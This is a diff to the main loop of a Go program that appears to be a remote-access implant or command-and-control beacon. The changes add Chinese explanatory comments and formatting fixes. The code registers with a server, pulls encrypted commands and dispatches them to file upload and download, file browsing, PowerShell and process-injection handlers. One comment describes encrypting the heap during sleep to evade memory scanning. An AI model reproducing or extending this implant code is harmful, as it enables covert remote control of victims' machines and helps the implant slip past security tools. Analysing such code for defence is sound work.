@@ -3,6 +3,7 @@ package main
 import (
 	"bytes"
 	"errors"
+
 	//"fmt"
 	"main/config"
 	"main/crypt"
@@ -14,33 +15,33 @@ import (
 )
 
 func main() {
-
-	ok := packet.FirstBlood()
+	// 首先合成的这个cookie在后续通信中充当了通信的校验码
+	ok := packet.FirstBlood() // 向服务器注册(此时，服务器收到第一个数据包，并已经在前端界面上显示内容了)
 	if ok {
 		var Token uintptr
 		var powershellImport []byte
 		for {
-			data, err := packet.PullCommand()
+			data, err := packet.PullCommand() // 拉取命令
 			if data != nil && err == nil {
 				totalLen := len(data)
 				if totalLen > 0 {
 					_ = data[totalLen-crypt.HmacHashLen:]
 					restBytes := data[:totalLen-crypt.HmacHashLen]
-					decrypted, errPacket := packet.DecryptPacket(restBytes)
-					if errPacket != nil{
+					decrypted, errPacket := packet.DecryptPacket(restBytes) // 解密数据；如果解密失败了，就向服务器返回错误内容
+					if errPacket != nil {
 						packet.ErrorProcess(errPacket)
 						continue
 					}
 					_ = decrypted[:4]
 					lenBytes := decrypted[4:8]
 					packetLen := packet.ReadInt(lenBytes)
-					decryptedBuf := bytes.NewBuffer(decrypted[8:])
+					decryptedBuf := bytes.NewBuffer(decrypted[8:]) // 解密后的数据需要进行解析
 					for {
 						if packetLen <= 0 {
 							break
 						}
-						cmdType, cmdBuf, errParse := packet.ParsePacket(decryptedBuf, &packetLen)
-						if errParse != nil{
+						cmdType, cmdBuf, errParse := packet.ParsePacket(decryptedBuf, &packetLen) // 解析出真正的内容
+						if errParse != nil {
 							packet.ErrorProcess(errParse)
 							continue
 						}
@@ -59,11 +60,11 @@ func main() {
 							case packet.CMD_TYPE_UPLOAD_START:
 								result, err = services.CmdUploadStart(cmdBuf)
 								callbackType = 32
-							case packet.CMD_TYPE_UPLOAD_LOOP:
+							case packet.CMD_TYPE_UPLOAD_LOOP: // 上下两个上传调用的底层内容相同，估计是断点续传还没做好
 								result, err = services.CmdUploadLoop(cmdBuf)
 								callbackType = 32
 							case packet.CMD_TYPE_DOWNLOAD:
-								result, err =services.CmdDownload(cmdBuf)
+								result, err = services.CmdDownload(cmdBuf)
 								callbackType = 32
 							case packet.CMD_TYPE_FILE_BROWSE:
 								result, err = services.CmdFileBrowse(cmdBuf)
@@ -140,12 +141,12 @@ func main() {
 								result, err = services.CmdPowershellPort(cmdBuf, powershellImport)
 								callbackType = 32
 							case packet.CMD_TYPE_INJECT_X64:
-								result, err = services.CmdInjectX64(cmdBuf)
+								result, err = services.CmdInjectX64(cmdBuf) // 注入目前并不支持，等待后续更新吧
 								callbackType = 32
 							default:
 								err = errors.New("This type is not supported now.")
 							}
-							if err != nil{
+							if err != nil {
 								packet.ErrorProcess(err)
 							} else {
 								finalPaket := packet.MakePacket(callbackType, util.ConvertChinese(result))
@@ -154,9 +155,10 @@ func main() {
 						}
 					}
 				}
-			} else if err != nil{
-				packet.ErrorProcess(err)
+			} else if err != nil {
+				packet.ErrorProcess(err) // 向服务器发送结果，并进入休眠
 			}
+			// 下面这一段主要是用来在休眠状态下加密运行堆的信息，从而规避内存扫描的
 			/*if config.Sleep_mask {
 				packet.DoSuspendThreads()
 				fmt.Println("EncryptHeap")
@@ -175,4 +177,3 @@ func main() {
 	}
 
 }
-
